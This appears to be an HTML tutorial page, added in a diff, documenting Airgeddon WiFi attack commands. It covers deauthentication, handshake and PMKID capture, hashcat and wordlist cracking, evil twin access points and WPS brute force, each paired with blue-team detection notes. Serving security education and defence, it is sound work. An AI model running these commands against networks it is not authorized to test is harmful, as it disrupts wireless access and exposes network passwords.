@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airgeddon WiFi Attack Framework | TKhoa's Cybersecurity Library</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="page">
+        <header>
+            <h1>Airgeddon - WiFi Attack Framework</h1>
+            <p>Airgeddon is a comprehensive wireless security testing framework. This page documents its commands for authorized red team assessments and defensive understanding.</p>
+        </header>
+
+        <section class="card">
+            <h2>Installation and Setup</h2>
+            <pre><code>sudo git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo chmod +x airgeddon.sh
+sudo ./airgeddon.sh</code></pre>
+            <p><strong>Defense Note:</strong> Detect suspicious script execution from /tmp or /home directories. Monitor for airgeddon installation attempts.</p>
+        </section>
+
+        <section class="card">
+            <h2>Launch Interactive Menu</h2>
+            <pre><code>sudo ./airgeddon.sh -h</code></pre>
+            <p>View all available options and interactive modes available in the framework.</p>
+        </section>
+
+        <section class="card">
+            <h2>Non-Interactive Mode - Handshake Capture</h2>
+            <pre><code>sudo ./airgeddon.sh -i wlan0 -m h -t BSSID -c CHANNEL -f /path/to/capture</code></pre>
+            <p>Capture WPA2/WPA3 handshakes in non-interactive mode. Defenders should monitor for repeated connection attempts.</p>
+        </section>
+
+        <section class="card">
+            <h2>Deauthentication Attack (Educational)</h2>
+            <pre><code>sudo ./airgeddon.sh -i wlan0 -m d -t BSSID</code></pre>
+            <p><strong>Red Team:</strong> Forces clients to disconnect, enabling handshake capture.</p>
+            <p><strong>Blue Team Defense:</strong> Monitor for excessive client disconnects or signal jamming patterns in wireless logs.</p>
+        </section>
+
+        <section class="card">
+            <h2>Wordlist Dictionary Attack</h2>
+            <pre><code>sudo ./airgeddon.sh -i wlan0 -m c -f /path/to/capture.cap -w /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>Attempt to crack handshake capture using a wordlist. Defenders: Enforce strong, unique passwords and monitor failed authentication attempts.</p>
+        </section>
+
+        <section class="card">
+            <h2>Evil Twin (Rogue AP) Creation</h2>
+            <pre><code>sudo ./airgeddon.sh -i wlan0 -m e -s "FakeSSID" -c CHANNEL</code></pre>
+            <p><strong>Red Team Assessment:</strong> Create a fake access point to test client security awareness.</p>
+            <p><strong>Blue Team Defense:</strong> Implement certificate pinning, HSTS, and teach users to verify network legitimacy.</p>
+        </section>
+
+        <section class="card">
+            <h2>Monitor Mode Activation</h2>
+            <pre><code>sudo airmon-ng start wlan0</code></pre>
+            <p>Enable monitor mode on wireless interface (required for most Airgeddon functions). Defenders should alert on unusual interface modes.</p>
+        </section>
+
+        <section class="card">
+            <h2>Check Available Networks</h2>
+            <pre><code>sudo airodump-ng wlan0mon</code></pre>
+            <p>Scan for all visible wireless networks. Use to identify target networks for authorized testing.</p>
+        </section>
+
+        <section class="card">
+            <h2>WiFi Channel Monitoring</h2>
+            <pre><code>sudo airodump-ng -c CHANNEL -b BSSID -w /tmp/airgeddon/captures/ wlan0mon</code></pre>
+            <p>Monitor specific channel and BSSID. Defenders: Watch for unusual channel hopping patterns.</p>
+        </section>
+
+        <section class="card">
+            <h2>Bruteforce PIN Attack (WPS)</h2>
+            <pre><code>sudo ./airgeddon.sh -i wlan0 -m w -t BSSID</code></pre>
+            <p>Attempt WPS brute force on compatible routers. Defense: Disable WPS on all devices when possible.</p>
+        </section>
+
+        <section class="card">
+            <h2>Packet Injection Test</h2>
+            <pre><code>sudo aireplay-ng --test wlan0mon</code></pre>
+            <p>Test if your adapter supports packet injection (required for deauth and other attacks).</p>
+        </section>
+
+        <section class="card">
+            <h2>PMKID Attack (WiFi Network Discovery)</h2>
+            <pre><code>sudo hcxdumptool -i wlan0mon --active_beacon --enable_status=15 -o /tmp/pmkid.pcap
+sudo hcxpcaptool -z /tmp/pmkid.16800 /tmp/pmkid.pcap
+sudo hashcat -m 16800 -a 3 /tmp/pmkid.16800 ?a?a?a?a?a?a?a?a</code></pre>
+            <p>Modern attack on WPA3 and WPA2 networks. Defense: Use strong, complex passwords and keep firmware updated.</p>
+        </section>
+
+        <section class="card">
+            <h2>Restore Normal Mode</h2>
+            <pre><code>sudo airmon-ng stop wlan0mon
+sudo systemctl restart networking</code></pre>
+            <p>Disable monitor mode and restore normal wireless operations.</p>
+        </section>
+
+        <section class="card">
+            <h2>Blue Team: Network Detection Signatures</h2>
+            <p><strong>Watch for these indicators:</strong></p>
+            <ul>
+                <li>Rapid client disconnections (deauth attack)</li>
+                <li>Duplicate SSID broadcasts (evil twin)</li>
+                <li>Unusual WPS activity or brute force attempts</li>
+                <li>Excessive beacon frames on single channel</li>
+                <li>Monitor interface changes on wireless adapters</li>
+                <li>Suspicious processes launching airmon-ng or airodump-ng</li>
+            </ul>
+        </section>
+
+        <p class="note"><a href="index.html">← Back to Tool Awareness</a></p>
+    </div>
+</body>
+</html>
